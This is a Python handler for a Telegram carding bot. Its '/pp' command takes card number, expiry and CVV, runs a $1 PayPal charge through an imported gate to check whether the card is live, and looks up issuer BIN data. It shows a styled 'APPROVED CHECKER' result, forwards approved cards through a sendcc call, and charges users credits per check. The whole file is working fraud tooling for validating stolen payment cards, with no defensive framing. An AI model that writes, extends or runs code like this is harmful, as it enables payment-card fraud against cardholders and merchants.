import httpx
import re
import time
import asyncio
import random
import string
from pyrogram import Client, filters
from FUNC.usersdb_func import *
from FUNC.defs import *
from TOOLS.check_all_func import *
from TOOLS.getbin import *
from .response import *
from .gate import create_paypal_charge
from faker import Faker


@Client.on_message(filters.command("pp", [".", "/"]))
async def paypal_check_cmd(Client, message):
    try:
        # Initial checks
        user_id = str(message.from_user.id)
        checkall = await check_all_thing(Client, message)
        if not checkall[0]:
            return

        role = checkall[1]
        getcc = await getmessage(message)
        if not getcc:
            resp = f"""<b>
Gate Name: PayPal Auth ✅
CMD: /pp

Message: No CC Found in your input ❌

Usage: /pp cc|mes|ano|cvv</b>"""
            await message.reply_text(resp)
            return

        cc, mes, ano, cvv = getcc
        fullcc = f"{cc}|{mes}|{ano}|{cvv}"
        gateway = "PayPal [1$]✅"
        bin6 = cc[:6]  # First 6 digits for bin reference
        proxy_status = "Live ✨"  # Default proxy status

        # Initial progress message
        firstresp = f"""
↯ Checking.

- 𝐂𝐚𝐫𝐝 - <code>{fullcc}</code>
- 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 - <i>{gateway}</i>
- 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 - ■□□□
</b>
"""
        await asyncio.sleep(0.5)
        firstchk = await message.reply_text(firstresp, message.id)

        # Second progress message
        secondresp = f"""
↯ Checking..

- 𝐂𝐚𝐫𝐝 - <code>{fullcc}</code>
- 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 - <i>{gateway}</i>
- 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 - ■■■□
"""
        await asyncio.sleep(0.5)
        secondchk = await Client.edit_message_text(message.chat.id, firstchk.id, secondresp)

        start = time.perf_counter()
        session = httpx.AsyncClient(timeout=30, follow_redirects=True)

        result = await create_paypal_charge(fullcc, session)
        getbin = await get_bin_details(cc)
        getresp = await get_charge_resp(result, user_id, fullcc)

        # Use .get with default empty strings and strip spaces
        status = getresp.get("status", "").strip()
        response = getresp.get("response", "").strip()

        # Debug print to check status and response
        print(f"DEBUG: status = '{status}', response = '{response}'")

        # Third progress message
        thirdresp = f"""
↯ Checking...

- 𝐂𝐚𝐫𝐝 - <code>{fullcc}</code>
- 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 - <i>{gateway}</i>
- 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 - ■■■■
"""
        await asyncio.sleep(0.5)
        thirdcheck = await Client.edit_message_text(message.chat.id, secondchk.id, thirdresp)

        brand = getbin[0] if len(getbin) > 0 else "Unknown"
        type_ = getbin[1] if len(getbin) > 1 else "Unknown"
        level = getbin[2] if len(getbin) > 2 else "Unknown"
        bank = getbin[3] if len(getbin) > 3 else "Unknown"
        country = getbin[4] if len(getbin) > 4 else "Unknown"
        flag = getbin[5] if len(getbin) > 5 else ""
        currency = getbin[6] if len(getbin) > 6 else "Unknown"

        finalresp = f"""
{status}
━━━━━━━━━━━━━
[ϟ] 𝗖𝗖 - <code>{fullcc}</code>
[ϟ] 𝗦𝘁𝗮𝘁𝘂𝘀 : {response}
[ϟ] 𝗚𝗮𝘁𝗲 - {gateway}
━━━━━━━━━━━━━
[ϟ] 𝗕𝗶𝗻 : {bin6}
[ϟ] 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 : {country} {flag}
[ϟ] 𝗜𝘀𝘀𝘂𝗲𝗿 : {bank}
[ϟ] 𝗧𝘆𝗽𝗲 : {brand} | {type_} | {level}
━━━━━━━━━━━━━
[ϟ] T/t : {time.perf_counter() - start:0.2f}s | Proxy : {proxy_status}
[ϟ] 𝗖𝗵𝗲𝗸𝗲𝗱 𝗯𝘆 : <a href='tg://user?id={message.from_user.id}'> {message.from_user.first_name}</a> [ {role} ]
[ϟ] 𝗢𝘄𝗻𝗲𝗿 : <a href='tg://user?id=6622603977'>𝑵𝒂𝒊𝒓𝒐𝒃𝒊𝒂𝒏𝒈𝒐𝒐𝒏</a>
╚━━━━━━「𝐀𝐏𝐏𝐑𝐎𝐕𝐄𝐃 𝐂𝐇𝐄𝐂𝐊𝐄𝐑」━━━━━━╝
"""
        await asyncio.sleep(0.5)
        await Client.edit_message_text(message.chat.id, thirdcheck.id, finalresp)

        # Flexible approved check (case-insensitive substring check)
        approved_keywords = ["approved", "success", "paid"]
        if any(keyword in status.lower() for keyword in approved_keywords):
            await sendcc(finalresp, session)

        await session.aclose()

        await setantispamtime(user_id)
        await deductcredit(user_id)

    except Exception:
        import traceback
        await error_log(traceback.format_exc())
